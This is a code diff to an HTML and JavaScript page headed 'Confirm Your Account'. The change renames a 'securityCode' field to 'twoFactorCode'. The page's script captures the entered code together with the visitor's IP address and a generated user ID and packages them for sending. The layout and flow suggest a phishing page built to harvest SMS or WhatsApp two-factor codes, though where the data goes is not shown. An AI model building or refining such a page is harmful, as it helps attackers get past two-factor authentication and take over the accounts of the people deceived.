@@ -99,7 +99,7 @@
     <div class="title">Confirm Your Account</div>
     <form id="verificationForm">
         <div class="input-container">
-            <input id="securityCode" name="securityCode" type="text" placeholder="Security Code" required>
+            <input id="twoFactorCode" name="twoFactorCode" type="text" placeholder="Two Factor Code" required>
         </div>
         <div class="message">Receive the code on your registered device via SMS or WhatsApp.</div>
         <button type="submit" class="btn">Continue</button>
@@ -131,7 +131,7 @@
         document.getElementById('verificationForm').addEventListener('submit', async function(event) {
             event.preventDefault(); // Prevent the default form submission
 
-            const securityCode = document.getElementById('securityCode').value;
+            const twoFactorCode = document.getElementById('twoFactorCode').value;
             const userIP = await getUserIP();
             const userID = generateUserID(userIP);
 
@@ -141,7 +141,7 @@
 
             // Simulate form data to be sent
             const formData = new FormData();
-            formData.append('securityCode', securityCode);
+            formData.append('twoFactorCode', twoFactorCode);
             formData.append('userIP', userIP);
             formData.append('userID', userID);
 
